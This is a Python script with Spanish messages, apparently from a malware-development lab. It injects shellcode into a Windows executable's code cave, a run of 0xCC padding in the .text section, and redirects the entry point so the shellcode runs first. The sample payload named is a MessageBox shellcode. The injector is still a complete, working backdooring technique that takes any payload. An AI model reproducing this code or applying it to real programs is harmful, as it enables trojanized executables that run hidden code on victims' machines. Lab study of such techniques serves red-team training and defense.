#!/usr/bin/env python3
import pefile
import os


def find_cc_block(pe, start_rva, text_size, x):
    print(f"[+] Buscando bloque CC: start_rva={hex(start_rva)}, Tamanyo={x}")

    data = pe.get_data(start_rva, text_size)

    if not data:
        print("[-] No se pudo leer datos en el rango")
        return None

    cc_block_start = None
    cc_block_length = 0

    for i, byte in enumerate(data):
        if byte == 0xCC:
            if cc_block_start is None:
                cc_block_start = start_rva + i + 1  # dejamos el primer CC fuera
                cc_block_length = 0
                print(f"[+] Inicio posible bloque CC en offset {hex(cc_block_start)}")
            else:
                cc_block_length += 1
                if cc_block_length >= x:
                    print(f"[+] Bloque CC encontrado en {hex(cc_block_start)}")
                    return cc_block_start
        else:
            if cc_block_start is not None:
                cc_block_start = None
                cc_block_length = 0

    print("[-] No se encontró bloque CC adecuado")
    return None


def overwrite_blob(pe_path, output_path, start_rva, blob_bytes):
    print(f"[+] Sobrescribiendo blob en {hex(start_rva)} ({len(blob_bytes)} bytes)")
    with open(pe_path, "rb") as f:
        data = bytearray(f.read())

    for i, byte in enumerate(blob_bytes):
        data[start_rva + i] = byte

    with open(output_path, "wb") as f:
        f.write(data)
    print(f"[+] Blob sobrescrito guardado en {output_path}")


def read_bin_file(path):
    print(f"[+] Leyendo binario: {path}")
    with open(path, "rb") as f:
        return f.read()


if __name__ == "__main__":
    path = r"C:\\Users\\test\\Desktop\\mal-dev-lab\\binaries\\bin\\simple_x86.exe"
    path_tmp = r"C:\\Users\\test\\Desktop\\mal-dev-lab\\binaries\\bin_v2\\tmp.exe"
    path_out = r"C:\\Users\\test\\Desktop\\mal-dev-lab\\binaries\\bin_v2\\simple_x86.exe"
    path_shellcode = r"C:\\Users\\test\\Desktop\\mal-dev-lab\\shellcodes\\x86\\messagebox\\build\\messagebox_patch.bin"

    print("[*] Cargando PE original...")
    pe = pefile.PE(path, fast_load=False)

    shellcode = read_bin_file(path_shellcode)
    shellcode_size = len(shellcode)
    print(f"[+] Tamaño del shellcode: {shellcode_size} bytes")

    address_of_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint

    text_section = next((s for s in pe.sections if s.Name.rstrip(b'\x00') == b'.text'), None)
    if not text_section:
        raise Exception("No se encontró la sección .text")

    pointer_to_raw_data = text_section.PointerToRawData
    size_of_raw_data = text_section.SizeOfRawData
    virtual_address = text_section.VirtualAddress

    print(f"[+] .text: PointerToRawData={hex(pointer_to_raw_data)}, SizeOfRawData={hex(size_of_raw_data)}, VirtualAddress={hex(virtual_address)}")

    rva_cc_block = find_cc_block(pe, pointer_to_raw_data, size_of_raw_data, shellcode_size)
    if rva_cc_block is None:
        raise Exception("No se encontró bloque CC adecuado")

    overwrite_blob(path, path_tmp, rva_cc_block, shellcode)

    rva_entrypoint_from_sec_text = address_of_entry_point - virtual_address
    rva_entrypoint_from_disk = pointer_to_raw_data + rva_entrypoint_from_sec_text
    diff_to_new_rva = rva_cc_block - rva_entrypoint_from_disk

    print(f"[+] Ajustando AddressOfEntryPoint: diff={diff_to_new_rva}")
    pe_tmp = pefile.PE(path_tmp, fast_load=False)
    pe_tmp.OPTIONAL_HEADER.AddressOfEntryPoint = address_of_entry_point + diff_to_new_rva
    pe_tmp.write(filename=path_out)

    print(f"[+] PE modificado guardado en: {path_out}")